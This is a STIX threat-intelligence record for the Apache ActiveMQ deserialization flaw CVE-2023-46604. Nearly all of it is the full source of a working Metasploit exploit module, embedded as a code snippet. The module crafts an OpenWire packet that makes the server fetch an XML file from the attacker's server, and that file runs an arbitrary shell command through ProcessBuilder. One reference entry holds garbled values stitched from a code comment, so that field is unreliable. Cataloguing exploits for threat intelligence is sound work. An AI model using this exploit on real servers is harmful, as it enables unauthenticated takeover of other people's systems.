{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c093f8d-c4e3-4d61-8722-1ff2e1a223a7",
    "created": "2024-08-14T17:06:46.631738Z",
    "modified": "2024-08-14T17:06:46.631742Z",
    "name": "Apache ActiveMQ Unauthenticated Remote Code Execution",
    "description": " This module exploits a deserialization vulnerability in the OpenWire transport unmarshaller in Apache ActiveMQ. Affected versions include 5.18.0 through to 5.18.2, 5.17.0 through to 5.17.5, 5.16.0 through to 5.16.6, and all versions before 5.15.16.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/apache_activemq_rce_cve_2023_46604.rb",
            "external_id": "apache_activemq_rce_cve_2023_46604.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-46604"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/X1r0z/ActiveMQ-RCE"
        },
        {
            "source_name": "reference",
            "url": "https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt"
        },
        {
            "source_name": "#leveragethiswecanuseClassPathXmlApplicationContext",
            "external_id": "andpassaURLtoanXMLconfigurationfilewe"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Retry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache ActiveMQ Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a deserialization vulnerability in the OpenWire transport unmarshaller in Apache\n          ActiveMQ. Affected versions include 5.18.0 through to 5.18.2, 5.17.0 through to 5.17.5, 5.16.0 through to\n          5.16.6, and all versions before 5.15.16.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'X1r0z', # Original technical analysis & exploit\n          'sfewer-r7', # MSF exploit & Rapid7 analysis\n        ],\n        'References' => [\n          ['CVE', '2023-46604'],\n          ['URL', 'https://github.com/X1r0z/ActiveMQ-RCE'],\n          ['URL', 'https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/'],\n          ['URL', 'https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis'],\n          ['URL', 'https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt']\n        ],\n        'DisclosureDate' => '2023-10-27',\n        'Privileged' => false,\n        'Platform' => %w[win linux unix],\n        'Arch' => [ARCH_CMD],\n        # The Msf::Exploit::Remote::HttpServer mixin will bring in Exploit::Remote::SocketServer, this will set the\n        # Stance to passive, which is unexpected and results in the exploit running as a background job, as RunAsJob will\n        # be set to true. To avoid this happening, we explicitly set the Stance to Aggressive.\n        'Stance' => Stance::Aggressive,\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ],\n          [\n            'Unix',\n            {\n              'Platform' => 'unix'\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          # By default ActiveMQ listens for OpenWire requests on TCP port 61616.\n          'RPORT' => 61616,\n          # The maximum time in seconds to wait for a session.\n          'WfsDelay' => 30\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n  end\n\n  def check\n    connect\n\n    res = sock.get_once\n\n    disconnect\n\n    return CheckCode::Unknown unless res\n\n    len, _, magic = res.unpack('NCZ*')\n\n    return CheckCode::Unknown unless res.length == len + 4\n\n    return CheckCode::Unknown unless magic == 'ActiveMQ'\n\n    return CheckCode::Detected unless res =~ /ProviderVersion...(\\d+\\.\\d+\\.\\d+)/\n\n    version = Rex::Version.new(::Regexp.last_match(1))\n\n    ranges = [\n      ['5.18.0', '5.18.2'],\n      ['5.17.0', '5.17.5'],\n      ['5.16.0', '5.16.6'],\n      ['0.0.0', '5.15.15']\n    ]\n\n    ranges.each do |min, max|\n      if version.between?(Rex::Version.new(min), Rex::Version.new(max))\n        return Exploit::CheckCode::Appears(\"Apache ActiveMQ #{version}\")\n      end\n    end\n\n    Exploit::CheckCode::Safe(\"Apache ActiveMQ #{version}\")\n  end\n\n  def exploit\n    # The payload is send in a CDATA section of an XML file. Therefore, the payload cannot contain a CDATA closing tag.\n    if payload.encoded.include? ']]>'\n      fail_with(Failure::BadConfig, 'The encoded payload data may not contain the CDATA closing tag ]]>')\n    end\n\n    start_service\n\n    connect\n\n    # The vulnerability allows us to instantiate an arbitrary class, with a single arbitrary string parameter. To\n    # leverage this we can use ClassPathXmlApplicationContext, and pass a URL to an XML configuration file we\n    # serve. This XML file allows us to create arbitrary classes, and call arbitrary methods. This is leveraged to\n    # run an attacker supplied command line via java.lang.ProcessBuilder.start.\n    clazz = 'org.springframework.context.support.ClassPathXmlApplicationContext'\n\n    # 31 is the EXCEPTION_RESPONSE data type.\n    data = [31].pack('C')\n    # ResponseMarshaller.looseUnmarshal reads a 4 byte int for the command id.\n    data << [0].pack('N')\n    # and a 1 byte boolean for response required.\n    data << [0].pack('C')\n    # ResponseMarshaller.looseUnmarshal read a 4 byte int for the correlation ID.\n    data << [0].pack('N')\n    # BaseDataStreamMarshaller.looseUnmarsalThrowable wants a boolean true to continue to unmarshall.\n    data << [1].pack('C')\n    # BaseDataStreamMarshaller.looseUnmarshalString reads a byte boolean and if true, reads a UTF-8 string.\n    data << [1].pack('C')\n    # First 2 bytes are the length.\n    data << [clazz.length].pack('n')\n    # Then the string data. This is the class name to instantiate.\n    data << clazz\n    # Same again for the method string. This is the single string parameter used during class instantiation.\n    data << [1].pack('C')\n    data << [get_uri.length].pack('n')\n    data << get_uri\n\n    sock.puts([data.length].pack('N') + data)\n\n    retry_until_truthy(timeout: datastore['WfsDelay']) do\n      !handler_enabled? || session_created?\n    end\n\n    handler\n  ensure\n    cleanup\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri != get_resource\n      super\n    end\n\n    case target['Platform']\n    when 'win'\n      shell = 'cmd.exe'\n      flag = '/c'\n    when 'linux', 'unix'\n      shell = '/bin/sh'\n      flag = '-c'\n    end\n\n    xml = %(<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n<bean id=\"#{Rex::Text.rand_text_alpha(8)}\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n  <constructor-arg>\n    <list>\n      <value>#{shell}</value>\n      <value>#{flag}</value>\n      <value><![CDATA[#{payload.encoded}]]></value>\n    </list>\n  </constructor-arg>\n</bean>\n</beans>)\n\n    send_response(cli, xml, {\n      'Content-Type' => 'application/xml',\n      'Connection' => 'close',\n      'Pragma' => 'no-cache'\n    })\n\n    print_status('Sent ClassPathXmlApplicationContext configuration file.')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-10-27",
    "x_mitre_platforms": [
        "unix"
    ]
}